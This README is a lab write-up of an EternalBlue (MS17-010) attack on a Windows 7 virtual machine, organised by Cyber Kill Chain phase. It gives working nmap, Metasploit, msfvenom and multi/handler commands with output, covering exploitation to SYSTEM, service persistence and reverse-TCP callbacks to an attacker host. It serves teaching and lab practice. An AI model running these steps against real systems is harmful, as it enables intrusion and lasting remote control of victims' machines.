# WannaCry-Style Attack Simulation — Cyber Kill Chain

> ⚠️ **For educational purposes only. All tests were performed in an isolated VMware lab. Never target systems you do not own.**

A full attack demonstration following the **Lockheed Martin Cyber Kill Chain**, simulating a WannaCry-style intrusion via the **MS17-010 (EternalBlue)** vulnerability on an unpatched Windows 7 machine — including exploitation, persistence, and reverse TCP command & control.

---

## Table of Contents

- [Overview](#overview)
- [Lab Environment](#lab-environment)
- [Tools Used](#tools-used)
- [Attack Chain](#attack-chain)
  - [1. Reconnaissance](#1-reconnaissance)
  - [2. Weaponization](#2-weaponization)
  - [3. Delivery & Exploitation](#3-delivery--exploitation)
  - [4. Installation & Persistence](#4-installation--persistence)
  - [5. Command & Control (C2)](#5-command--control-c2)
- [Results Summary](#results-summary)
- [Disclaimer](#disclaimer)
- [References](#references)

---

## Overview

| Property | Value |
|---|---|
| Vulnerability | MS17-010 / EternalBlue |
| CVE | [CVE-2017-0143](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143) |
| Target OS | Windows 7 Professional SP1 x64 |
| Attack type | Remote Code Execution via SMBv1 |
| Post-exploitation | Persistence via Windows Service + Meterpreter reverse TCP |
| Framework | Lockheed Martin Cyber Kill Chain |

---

## Lab Environment

| Role | OS | IP Address |
|---|---|---|
| **Attacker** | Kali Linux | `192.168.156.128` |
| **Victim** | Windows 7 x64 SP1 | `192.168.156.143` |
| **Hypervisor** | VMware Workstation | — |

> Both machines are on an isolated **VMware host-only network**. No traffic leaves the lab.

---

## Tools Used

| Tool | Purpose |
|---|---|
| `nmap` | Host discovery, service scanning, vulnerability detection |
| `Metasploit Framework (msfconsole)` | Exploit delivery and post-exploitation |
| `exploit/windows/smb/ms17_010_eternalblue` | EternalBlue SMBv1 RCE exploit |
| `exploit/windows/persistence/service` | Windows service-based persistence |
| `msfvenom` | Standalone reverse shell payload generation |
| `exploit/multi/handler` | C2 listener for incoming Meterpreter sessions |

---

## Attack Chain

### 1. Reconnaissance

**Objective:** Identify the target, map open services, and confirm exploitable vulnerabilities.

**Pre-requisite:** Windows Firewall was disabled on the victim to simulate a poorly secured endpoint.

![Firewall disabled](./screenshots/01-firewall-disabled.png)

---

#### Host Discovery — Ping

```bash
ping 192.168.156.143
```

```
4 packets transmitted, 4 received, 0% packet loss
→ Target is alive and reachable
```

#### Service Scan — Nmap

```bash
nmap -sV -p- 192.168.156.143
```

| Port | State | Service | Version |
|---|---|---|---|
| 135/tcp | open | msrpc | Microsoft Windows RPC |
| 139/tcp | open | netbios-ssn | Microsoft Windows NetBIOS-SSN |
| **445/tcp** | **open** | **microsoft-ds** | **Windows 7–10 (WORKGROUP)** |

> **Port 445 (SMB)** is open — this is the Windows file-sharing protocol and the attack surface for EternalBlue.

![Ping and nmap service scan](./screenshots/02-ping-nmap-scan.png)

---

#### Vulnerability Scan

```bash
nmap --script vuln 192.168.156.143
```

```
smb-vuln-ms17-010:
  VULNERABLE
  Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
  State: VULNERABLE
  IDs: CVE:CVE-2017-0143
  Risk factor: HIGH
  Disclosure date: 2017-03-14
  References:
    https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
    https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
    https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
```

![Vulnerability scan — MS17-010 VULNERABLE](./screenshots/03-vuln-scan.png)

---

### 2. Weaponization

**Objective:** Select and configure the EternalBlue exploit module in Metasploit.

```bash
msfconsole
search ms17_010
use exploit/windows/smb/ms17_010_eternalblue
show options
```

![Metasploit module search](./screenshots/04-metasploit-search.png)

![Module options](./screenshots/05-eternalblue-options.png)

Module configuration:

```bash
set RHOSTS 192.168.156.143   # victim IP
set LHOST  192.168.156.128   # attacker IP
set LPORT  4444              # listener port
# Payload auto-selected: windows/x64/meterpreter/reverse_tcp
```

---

### 3. Delivery & Exploitation

**Objective:** Send the EternalBlue exploit over SMB (port 445) and land a Meterpreter shell.

```bash
exploit
```

```
[*] Started reverse TCP handler on 192.168.156.128:4444
[+] 192.168.156.143:445 - Host is likely VULNERABLE to MS17-010
[+] 192.168.156.143:445 - The target is vulnerable.
[*] 192.168.156.143:445 - ETERNALBLUE overwrite completed successfully (0x0000000D)!
[*] Sending stage (248902 bytes) to 192.168.156.143
[*] Meterpreter session 1 opened (192.168.156.128:4444 → 192.168.156.143:49160)
```

![EternalBlue exploit — session opened](./screenshots/06-exploitation.png)

#### Access Verification

```bash
meterpreter > sysinfo
```
```
Computer : WIN-OL4C4HMJ383
OS       : Windows 7 (6.1 Build 7601, Service Pack 1)
Arch     : x64
```

```bash
meterpreter > getuid
```
```
Server username: NT AUTHORITY\SYSTEM
```

> ✅ **Full system-level access achieved** without any credentials.

Cleanup of any residual payload processes:

```bash
meterpreter > shell
C:\Windows\system32> tasklist | findstr payload.exe
# payload.exe  1404  Services  0  2,156 K

C:\Windows\system32> taskkill /F /IM payload.exe
# SUCCESS: The process "payload.exe" with PID 1404 has been terminated.
```

![Shell access and cleanup](./screenshots/07-shell-access.png)

---

### 4. Installation & Persistence

**Objective:** Survive reboots — maintain access even after the original Meterpreter session dies.

```bash
search persistence
use exploit/windows/persistence/service
set LHOST 192.168.156.128
set SESSION 1
show options
run
```

```
[+] The target appears to be vulnerable. Likely exploitable
[+] Payload written to C:\Windows\TEMP\cZYP.exe
[*] Meterpreter session 2 opened (192.168.156.128:4444 → 192.168.156.143:49161)
```

> A Windows service was registered on the victim that launches the payload automatically on every boot.

![Search persistence modules](./screenshots/08-persistence-search.png)

![Load windows/persistence/service](./screenshots/09-persistence-module.png)

![Persistence module options](./screenshots/10-persistence-options.png)

![Persistence run — session 2 opened](./screenshots/11-persistence-run.png)

![Active sessions — 1 and 2](./screenshots/12-persistence-sessions.png)

---

#### Standalone Payload with msfvenom

A self-contained reverse shell executable was also generated for the C2 phase:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.156.128 LPORT=5386 \
  -f exe -o payload.exe
```

```
Payload size: 509 bytes
Final size of exe file: 7680 bytes
Saved as: payload.exe
```

![msfvenom payload generation](./screenshots/13-msfvenom.png)

---

### 5. Command & Control (C2)

**Objective:** Set up a persistent listener that catches callbacks from the payload after every reboot.

```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.156.128
set LPORT 5386
exploit -j
```

```
[*] Exploit running as background job 1.
[*] Started reverse TCP handler on 192.168.156.128:5386
```

![multi/handler listener](./screenshots/14-c2-handler.png)

The Windows 7 VM was restarted to simulate a real reboot event:

![VM restart via VMware](./screenshots/15-vm-restart.png)

After reboot, the persistence service fired automatically and opened multiple sessions:

```
[*] Meterpreter session 3 opened (192.168.156.128:4444 → 192.168.156.143:49155)
[*] Meterpreter session 4 opened (192.168.156.128:4444 → 192.168.156.143:49156)
[*] Meterpreter session 5 opened (192.168.156.128:5386 → 192.168.156.143:49159)
[*] Meterpreter session 6 opened (192.168.156.128:5386 → 192.168.156.143:49160)
```

![Persistent Meterpreter sessions after reboot](./screenshots/16-persistent-sessions.png)

---

## Results Summary

| # | Kill Chain Phase | Technique | Outcome |
|---|---|---|---|
| 1 | Reconnaissance | `ping`, `nmap -sV`, `nmap --script vuln` | Port 445 open; CVE-2017-0143 confirmed VULNERABLE |
| 2 | Weaponization | Metasploit `ms17_010_eternalblue` | Exploit module configured |
| 3 | Delivery | EternalBlue exploit over SMB port 445 | Exploit packet sent |
| 4 | Exploitation | Kernel pool corruption → stage injection | Meterpreter session 1; `NT AUTHORITY\SYSTEM` |
| 5 | Installation | `windows/persistence/service` + `msfvenom` | Windows service created; payload at `C:\Windows\TEMP\cZYP.exe` |
| 6 | C2 | `multi/handler` reverse TCP on port 5386 | Sessions 3–6 opened automatically after reboot |
| 7 | Actions on Objectives | Meterpreter shell | Full SYSTEM-level control confirmed |

---

## Disclaimer

> ⚠️ **This project is strictly for educational and academic purposes.**
>
> All activities were performed inside an **isolated, offline VMware lab** using virtual machines owned and controlled by the author. No real systems, production networks, or third parties were targeted, accessed, or affected at any point.
>
> Reproducing this attack against any system you do not own or have **explicit written authorization** to test is a criminal offense under applicable computer crime laws (including but not limited to the US Computer Fraud and Abuse Act, the UK Computer Misuse Act, and Algerian Law 09-04 on cybercrime). The author bears no responsibility for any misuse of the information in this repository.

---

## References

- [Microsoft Security Bulletin MS17-010](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)
- [CVE-2017-0143 — MITRE NVD](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143)
- [EternalBlue — Wikipedia](https://en.wikipedia.org/wiki/EternalBlue)
- [Lockheed Martin Cyber Kill Chain](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html)
- [Microsoft WannaCry Customer Guidance](https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/)
- [Metasploit Framework Documentation](https://docs.metasploit.com)
- [Nmap Scripting Engine — smb-vuln-ms17-010](https://nmap.org/nsedoc/scripts/smb-vuln-ms17-010.html)
